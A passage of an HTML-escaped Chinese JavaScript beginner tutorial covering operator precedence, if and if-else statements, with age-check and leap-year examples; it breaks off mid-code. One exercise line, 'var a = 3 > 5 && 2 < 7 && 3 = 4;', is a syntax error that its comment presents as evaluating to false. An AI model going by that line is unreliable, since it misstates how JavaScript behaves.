&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;57-运算符优先级&#34;&gt;5.7 运算符优先级&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;一元运算符里面的==逻辑非优先级很高==&lt;/li&gt;
&lt;li&gt;逻辑与比逻辑或优先级高&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;优先级&lt;/th&gt;
&lt;th&gt;运算符&lt;/th&gt;
&lt;th&gt;顺序&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;小括号&lt;/td&gt;
&lt;td&gt;&lt;code&gt;()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;一元运算符&lt;/td&gt;
&lt;td&gt;&lt;code&gt;++&lt;/code&gt; &lt;code&gt;--&lt;/code&gt; &lt;code&gt;!&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;算数运算符&lt;/td&gt;
&lt;td&gt;先&lt;code&gt;*&lt;/code&gt; &lt;code&gt;/&lt;/code&gt; &lt;code&gt;%&lt;/code&gt;后&lt;code&gt;+&lt;/code&gt; &lt;code&gt;-&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;关系运算符&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; &lt;code&gt;&amp;gt;=&lt;/code&gt; &lt;code&gt;&amp;lt;&lt;/code&gt; &lt;code&gt;&amp;lt;=&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;相等运算符&lt;/td&gt;
&lt;td&gt;&lt;code&gt;==&lt;/code&gt; &lt;code&gt;!=&lt;/code&gt; &lt;code&gt;===&lt;/code&gt; &lt;code&gt;!==&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;逻辑运算符&lt;/td&gt;
&lt;td&gt;先 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 后 &lt;code&gt;||&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;赋值运算符&lt;/td&gt;
&lt;td&gt;&lt;code&gt;=&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;逗号运算符&lt;/td&gt;
&lt;td&gt;&lt;code&gt;,&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;练习1&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;( &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;人&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;阿凡达&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;( &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;22&amp;#39;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;练习2&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;;					&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;6-javascript流程控制---分支&#34;&gt;6. JavaScript流程控制 - 分支&lt;/h1&gt;
&lt;h2 id=&#34;本节目标-4&#34;&gt;本节目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够使用 if 分支语句&lt;/li&gt;
&lt;li&gt;能够使用 switch 分支语句&lt;/li&gt;
&lt;li&gt;能够使用三元表达式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;本节目录-3&#34;&gt;本节目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;流程控制&lt;/li&gt;
&lt;li&gt;顺序流程控制&lt;/li&gt;
&lt;li&gt;分支流程控制 if 语句&lt;/li&gt;
&lt;li&gt;三元表达式&lt;/li&gt;
&lt;li&gt;分支流程控制 switch 语句&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;61-流程控制&#34;&gt;6.1 流程控制&lt;/h2&gt;
&lt;p&gt;再一个程序执行的过程中，各条代码的执行顺序对程序的结果是有直接影响的。很多时候我们要通过控制代码的执行顺序来实现我们要完成的功能。&lt;/p&gt;
&lt;p&gt;简单理解：流程控制就是来控制我们的代码按照什么结构顺序来执行&lt;/p&gt;
&lt;p&gt;流程控制主要有三种结构，分别是顺序结构、分支结构和循环结构，这三种结构代表三种代码执行的顺序。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200509123856.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;62-顺序流程控制&#34;&gt;6.2 顺序流程控制&lt;/h2&gt;
&lt;p&gt;顺序结构是程序中最简单、最基本的流程控制，它没有特定的语法结构，程序会按照&lt;strong&gt;代码的先后顺序&lt;/strong&gt;，&lt;strong&gt;依次执行&lt;/strong&gt;，程序中大多数的代码都是这样执行的。&lt;/p&gt;
&lt;h2 id=&#34;63-分支流程控制-if-语句&#34;&gt;6.3 分支流程控制 if 语句&lt;/h2&gt;
&lt;h3 id=&#34;631-分支结构&#34;&gt;6.3.1 分支结构&lt;/h3&gt;
&lt;p&gt;由上到下代码执行的过程中，根据不同的条件，执行不同的路径代码（执行代码多选一的过程），从而得到不同的结果。&lt;/p&gt;
&lt;p&gt;JS 语言提供了两种分支结构语句&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if 语句&lt;/li&gt;
&lt;li&gt;switch 语句&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;632-if-语句&#34;&gt;6.3.2 if 语句&lt;/h3&gt;
&lt;h4 id=&#34;6321-语法结构&#34;&gt;6.3.2.1 语法结构&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 条件成立执行代码，否则什么也不做
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;) {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 条件成立执行的代码语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;语句可以理解为一个行为，循环语句和分支语句就是典型的语句。一个程序由很多个语句组成，一般情况下，会分割成一个一个的语句。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;6322-执行流程&#34;&gt;6.3.2.2 执行流程&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200509124924.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. if 的语法结构 如果 if
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 执行语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 执行思路，如果 if 里面的条件表达式结果为真true，则执行大括号里面的执行语句，如果if条件表达式结果为假，则不执行大括号里面的语句，则执行if语句后面的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 代码体验
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;沙漠骆驼&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;案例进入网吧&#34;&gt;案例：进入网吧&lt;/h5&gt;
&lt;p&gt;弹出一个输入框，要求用户输入年龄，如果年龄大于等于18岁，允许进入网吧。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;弹出 prompt 输入框，用户输入年龄，程序把这个值取过来保存到变量中&lt;/li&gt;
&lt;li&gt;使用 if 语句来判断年龄，如果年龄大于18就执行 if 大括号里面的输出语句&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 弹出 prompt 输入框，用户输入年龄，程序把这个值取过来保存到变量中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 使用 if 语句来判断年龄，如果年龄大于18就执行 if 大括号里面的输出语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入你的年龄：&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我想带你去网吧偷耳机&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;633-if-else-语句双分支语句&#34;&gt;6.3.3 if else 语句（双分支语句）&lt;/h3&gt;
&lt;h4 id=&#34;6331-语法结构&#34;&gt;6.3.3.1 语法结构&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 条件成立，执行if里面代码，否则执行else里面的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;) {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 【如果】条件成立执行的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 【否则】执行的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;6332-执行流程&#34;&gt;6.3.3.2 执行流程&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200509145347.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 语法结构
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 执行语句1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 执行语句2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 执行思路，如果表达式结果为真，那么执行语句1，否则，执行语句2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 代码验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入你的年龄：&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我想带你去网吧偷耳机&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;滚，回家做作业去&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. if里面的语句1 和 else里面的语句2，最终只能有一个语句执行，2选1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5.else后面直接跟大括号
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例2判断闰年&#34;&gt;案例2：判断闰年&lt;/h4&gt;
&lt;p&gt;接收用户输入的年份，如果是闰年就弹出闰年，否则弹出是平年&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;算法：能被4整除且不能整除100的为闰年（如2004年就是闰年，1901年不是闰年）或者能够被400整除的就是闰年&lt;/li&gt;
&lt;li&gt;弹出prompt输入框，让用户输入年份，把这个值取过来保存到变量中&lt;/li&gt;
&lt;li&gt;使用if语句来判断是否是闰年，如果是闰年，就执行if大括号里面的输出语句，否则就执行else里面的输出语句&lt;/li&gt;
&lt;li&gt;一定要注意里面的且&amp;amp;&amp;amp;还有或者||的写法，同时注意判断整除的方法是取余为0&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 算法：能被4整除且不能整除100的为闰年（如2004年就是闰年，1901年不是闰年）或者能够被400整除的就是闰年
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 弹出prompt输入框，让用户输入年份，把这个值取过来保存到变量中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 3. 使用if语句来判断是否是闰年，如果是闰年，就执行if大括号里面的输出语句，否则就执行else里面的输出语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 4. 一定要注意里面的且&amp;amp;&amp;amp;还有或者||的写法，同时注意判断整除的方法是取余为0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入年份：&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
